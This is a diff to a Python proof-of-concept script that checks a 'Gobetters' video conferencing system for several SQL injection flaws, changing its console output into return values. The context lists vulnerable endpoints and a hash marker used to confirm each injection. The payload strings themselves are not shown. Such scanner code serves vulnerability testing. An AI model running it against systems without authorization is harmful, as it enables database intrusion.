@@ -9,8 +9,8 @@ description: Gobetters视频会议系统多处SQL注入漏洞。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class gobetters_multi_sqli_BaseVerify:
     def __init__(self, url):
@@ -34,7 +34,7 @@ class gobetters_multi_sqli_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
             vulnurl = self.url + "/web/users/usersave.php"
             post_data = {
@@ -55,7 +55,7 @@ class gobetters_multi_sqli_BaseVerify:
             }
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    return "[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
             
             vulnurl = self.url + "/web/department/departmentsave.php"
             post_data = {
@@ -66,7 +66,7 @@ class gobetters_multi_sqli_BaseVerify:
             }
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    return "[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
             vulnurl = self.url + "/web/monitor/monitormentsave.php"
             post_data = {
@@ -77,7 +77,7 @@ class gobetters_multi_sqli_BaseVerify:
             }
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    return "[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
             vulnurl = self.url + "/web/users/result.php"
             post_data = {
@@ -85,12 +85,12 @@ class gobetters_multi_sqli_BaseVerify:
             }
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    return "[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = gobetters_multi_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
